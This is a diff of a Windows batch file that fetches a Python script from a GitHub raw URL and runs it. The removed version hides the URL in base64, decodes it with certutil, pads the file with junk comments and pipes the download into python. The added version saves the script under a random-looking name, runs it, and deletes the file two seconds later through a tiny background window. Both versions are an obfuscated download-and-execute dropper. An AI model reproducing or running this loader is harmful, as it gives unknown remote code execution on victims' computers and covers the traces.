@@ -1,10 +1,6 @@
 @echo off
-set amKiP=aHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS9zdm93eXh4ZGV2L2Nsb3VkLXNlcnZlci9yZWZzL2hlYWRzL21haW4vc2VydmVyLnB5
-setlocal EnableDelayedExpansion
-::38bLLjkHAdRrIGSA5JukBk2ozd4a14UwI3EZRH8jAVpkOdwTe338bLLjkHAdRrIGSA5JukBk2ozd4a14UwI3EZRH8jAVpkOdwTe3
-for /f "delims=" %%i in ('echo !amKiP! ^| certutil -decode -f - | findstr /v /c:"CertUtil"') do (
-    set LOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOOLOLOL=%%i
-)
-::jAVpkOdwTe338bLLjkHAdRrIGSA5JukBk2ozd4a14UwI3EZRH8jAVpkOdwTe3jAVpkOdwTe338bLLjkHAdRrIGSA5JukBk2ozd4a14UwI3EZRH8jAVpkOdwTe3
-::dwTe338bLLjkHAdRrIGSA5JukBk2ozd4a14UwI3EZRH8jAVpkOdwTe3jAVpkOjAVpkOjAVpkOjAVpkOjAVpkOjAVpkO
-curl -s !LOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOLOOLOLOL! | python -
+curl -s https://raw.githubusercontent.com/snowyxxdev/cloud-server/refs/heads/main/server.py -o AmKiPjdjUD82mKiPjdjUD82mKiPjdjUD82Jls.py
+title server
+cls
+start cmd /c "mode con: cols=20 lines=1 && title server && timeout /t 2 /nobreak >nul && del AmKiPjdjUD82mKiPjdjUD82mKiPjdjUD82Jls.py && exit"
+python AmKiPjdjUD82mKiPjdjUD82mKiPjdjUD82Jls.py
